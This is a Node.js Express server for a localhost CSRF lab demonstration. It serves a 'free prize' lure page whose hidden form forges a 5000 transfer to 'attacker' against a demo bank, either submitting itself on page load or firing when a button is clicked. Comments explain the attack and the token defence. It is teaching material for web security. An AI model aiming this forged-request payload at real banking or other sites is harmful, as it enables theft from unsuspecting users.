'use strict';

/**
 * The "malicious" site, for the controlled lab demonstration ONLY.
 *
 * It runs on http://localhost:4000 — a DIFFERENT ORIGIN from the bank at
 * http://localhost:3000. It never sees the victim's cookie and never talks to
 * the bank directly; it simply serves an HTML page that makes the VICTIM'S OWN
 * BROWSER send a forged request to the bank. That is the essence of CSRF.
 *
 * Everything here is confined to localhost. It targets only the demo bank you
 * run yourself. Do not point this at any real or third-party system.
 */
const express = require('express');
const path = require('path');

const PORT = Number(process.env.ATTACKER_PORT) || 4000;
const BANK = process.env.BANK_URL || 'http://localhost:3000';

const app = express();
app.disable('x-powered-by');

// Serve the static attacker pages, injecting the bank URL so the demo is easy
// to reconfigure.
app.get(['/', '/auto', '/click'], (req, res) => {
  const auto = req.path !== '/click'; // "/click" waits for a button; others auto-fire
  res.send(page(BANK, auto));
});

function page(bank, auto) {
  // Feather "gift" icon (the same artwork react-icons ships as FiGift), drawn
  // in black with stroke="currentColor" — a monochrome icon, not an emoji.
  const giftIcon =
    '<svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="currentColor" ' +
    'stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' +
    '<polyline points="20 12 20 22 4 22 4 12"/><rect x="2" y="7" width="20" height="5"/>' +
    '<line x1="12" y1="22" x2="12" y2="7"/>' +
    '<path d="M12 7H7.5a2.5 2.5 0 0 1 0-5C11 2 12 7 12 7z"/>' +
    '<path d="M12 7h4.5a2.5 2.5 0 0 0 0-5C13 2 12 7 12 7z"/></svg>';

  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>You have won a FREE prize!</title>
  <style>
    body{font-family:"Segoe UI",system-ui,Arial,sans-serif;background:#f4f6fb;color:#0f172a;
         display:grid;place-items:center;min-height:100vh;margin:0;text-align:center}
    .box{max-width:520px;margin:16px;padding:40px 32px;background:#fff;border-radius:18px;
         border:1px solid #e4e8f0;box-shadow:0 12px 40px rgba(16,24,40,.10)}
    h1{margin:0 0 8px;letter-spacing:-.3px} .icon{color:#0f172a;margin-bottom:8px}
    .muted{color:#64748b;line-height:1.55}
    button{margin-top:18px;padding:13px 22px;border:0;border-radius:11px;
           background:#2563eb;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
    button:hover{background:#1d4ed8}
  </style>
</head>
<body>
  <div class="box">
    <div class="icon">${giftIcon}</div>
    <h1>Congratulations!</h1>
    <p class="muted">You are our 1,000,000th visitor. Click to claim your free
    prize. (This looks harmless, doesn't it?)</p>

    <!--
      THE ATTACK.
      This hidden form posts to the bank's /transfer endpoint. Note:
        * The attacker does NOT know and does NOT include any session cookie —
          the browser attaches the victim's SecureBank cookie automatically.
        * There is NO CSRF token here, because the attacker cannot read the
          bank's token (the Same-Origin Policy blocks that).
      Against the VULNERABLE bank this succeeds. Against the PROTECTED bank the
      server rejects it with HTTP 403 because the token is missing.
    -->
    <form id="attack" action="${bank}/transfer" method="POST">
      <input type="hidden" name="to" value="attacker">
      <input type="hidden" name="amount" value="5000">
    </form>

    ${auto
      ? `<p class="muted">Loading your prize…</p>
         <script>
           // Auto-submit as soon as the page loads: the victim does nothing.
           document.getElementById('attack').submit();
         </script>`
      : `<button onclick="document.getElementById('attack').submit()">Claim your free prize</button>
         <p class="muted">Behind this button is a hidden transfer of Nu. 5000 to "attacker".</p>`}
  </div>
</body>
</html>`;
}

app.listen(PORT, () => {
  console.log(`Attacker page running at http://localhost:${PORT}`);
  console.log(`It will forge transfers against ${BANK}`);
});
